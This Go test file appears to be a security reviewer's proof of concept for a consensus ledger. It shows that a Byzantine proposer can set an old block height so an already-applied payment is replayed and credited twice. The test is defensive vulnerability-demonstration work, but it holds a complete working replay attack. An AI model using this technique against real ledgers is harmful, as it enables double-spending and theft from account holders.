package node

import (
	"testing"
	"time"

	"github.com/eval-apply-labs/go-ledger/consensus"
	"github.com/eval-apply-labs/go-ledger/ledger"
	"github.com/eval-apply-labs/go-ledger/signing"
)

// PoC (critic, round 2): Block.Height is never bound to the consensus height. A single Byzantine
// validator (1 of 4, below the 1/3 bound) that is the scheduled proposer builds a block on the
// CURRENT state but with Block.Height = an OLD height, carrying an already-applied payment whose
// BlockID == that old height. ApplyBlock checks payment.BlockID == block.Height (attacker-chosen),
// onProposal only checks ProposalMsg.Height (signed separately), so all honest nodes validate,
// prevote, precommit and commit it: the payment is applied a second time.
func TestPoCCriticByzantineProposerReplaysOldPaymentViaBlockHeight(t *testing.T) {
	scheme, network := signing.Ed25519{}, "testnet"
	const nVals = 4
	signers := make([]*signing.Signer, nVals)
	vals := make([]consensus.Validator, nVals)
	for i := range signers {
		s, _ := signing.Generate(scheme, network)
		signers[i] = s
		vals[i] = consensus.Validator{PublicKey: s.PublicKeyBase64(), Power: 1}
	}
	vs := consensus.NewValidatorSet(vals)
	attacker := signers[3] // validator #4: its key is held by the test (Byzantine), runs no honest node

	alice, _ := signing.Generate(scheme, network)
	mallory, _ := signing.Generate(scheme, network) // attacker's beneficiary account
	genesis := []ledger.Account{
		{PublicKey: alice.PublicKeyBase64(), Name: "alice", Amount: rat("100"), ValidatorNode: "v"},
	}

	b := newBus()
	nodes := make([]*Node, 3)
	for i := 0; i < 3; i++ {
		nodes[i] = New(Config{
			NetworkID: network, Scheme: scheme, Signer: signers[i], Validators: vs,
			TransactionCost: rat("0.1"), Timeout: 300 * time.Millisecond, Genesis: genesis,
		}, b)
		b.register(signers[i].PublicKeyBase64(), nodes[i])
	}

	// Honest payment alice -> mallory 30 at block 1.
	pay, _ := ledger.SignPayment(alice, ledger.Payment{
		PublicKeyFrom: alice.PublicKeyBase64(), PublicKeyTo: mallory.PublicKeyBase64(), Amount: rat("30"), BlockID: 1,
	})
	for _, nd := range nodes {
		nd.SubmitPayment(pay) // queued before Start (AdmitPayment would block with no loop running)
	}
	for _, nd := range nodes {
		nd.Start()
	}
	defer func() {
		for _, nd := range nodes {
			nd.Stop()
		}
	}()

	waitAll := func(h int64, d time.Duration) []Snapshot {
		deadline := time.Now().Add(d)
		for {
			snaps := make([]Snapshot, 0, 3)
			ok := true
			for _, nd := range nodes {
				s := nd.Snapshot()
				snaps = append(snaps, s)
				if s.Height < h {
					ok = false
				}
			}
			if ok {
				return snaps
			}
			if time.Now().After(deadline) {
				t.Fatalf("nodes did not reach height %d; heights=%v", h, heights(snaps))
			}
			time.Sleep(5 * time.Millisecond)
		}
	}
	snaps := waitAll(2, 10*time.Second)
	if got := balance(snaps[0].Accounts, alice.PublicKeyBase64()); got.Cmp(rat("70")) != 0 {
		t.Fatalf("premise: alice should hold 70 after the honest payment, has %s", got.RatString())
	}
	t.Logf("after the honest payment: alice=%s mallory=%s", balance(snaps[0].Accounts, alice.PublicKeyBase64()).RatString(),
		balance(snaps[0].Accounts, mallory.PublicKeyBase64()).RatString())

	// Find a future height H whose round-0 proposer is the attacker, and whose predecessor's round-0
	// proposer is NOT (keeps the PoC clear of the separate post-commit-window bug C21).
	cur := snaps[0].Height
	var H int64
	for h := cur + 1; h < cur+200; h++ {
		if vs.ProposerAt(h, 0) == attacker.PublicKeyBase64() && vs.ProposerAt(h-1, 0) != attacker.PublicKeyBase64() {
			H = h
			break
		}
	}
	if H == 0 {
		t.Fatal("no attacker height found")
	}
	t.Logf("attacker is the round-0 proposer at height %d", H)

	// Wait until every honest node is AT height H (driver started), then inject the Byzantine proposal.
	snaps = waitAll(H, 60*time.Second)
	for _, s := range snaps {
		if s.Height != H {
			t.Skipf("a node overshot height %d (heights=%v); rerun", H, heights(snaps))
		}
	}
	time.Sleep(20 * time.Millisecond) // past the 1 ms post-commit window
	prev := ledger.LedgerState{Accounts: snaps[0].Accounts, Parameters: snaps[0].Parameters, GovernanceSequence: snaps[0].GovernanceSequence}
	// The malicious block: built on the CURRENT committed state, but naming OLD height 1.
	blk := ledger.ProposeBlock(scheme, network, 1, prev, ledger.BlockContent{Payments: []ledger.Payment{pay}}, vs)
	if len(blk.Payments) != 1 || blk.Height != 1 {
		t.Fatalf("premise: malicious block should carry the old payment at Height 1: %+v", blk)
	}
	if _, ok := ledger.ApplyBlock(scheme, network, prev, blk, vs); !ok {
		t.Fatal("ApplyBlock rejected the replay block (no bug)")
	}
	pm := ProposalMsg{Height: H, Round: 0, ValidRound: -1, Block: blk}
	if err := SignProposal(attacker, &pm); err != nil {
		t.Fatal(err)
	}
	for _, nd := range nodes {
		nd.SubmitProposal(pm)
	}

	snaps = waitAll(H+1, 10*time.Second)
	for i, s := range snaps {
		if ledger.StateDigest(s.Accounts) != ledger.StateDigest(snaps[0].Accounts) {
			t.Fatalf("node %d diverged", i)
		}
	}
	a := balance(snaps[0].Accounts, alice.PublicKeyBase64())
	m := balance(snaps[0].Accounts, mallory.PublicKeyBase64())
	t.Logf("after Byzantine block at height %d: alice=%s mallory=%s (all 3 honest nodes agree)", H, a.RatString(), m.RatString())
	if a.Cmp(rat("70")) != 0 {
		t.Errorf("REPLAY: alice's single signed 30-unit payment (BlockID 1) was applied AGAIN at height %d: alice=%s (want 70), mallory=%s (want 29.9)",
			H, a.RatString(), m.RatString())
	}
}
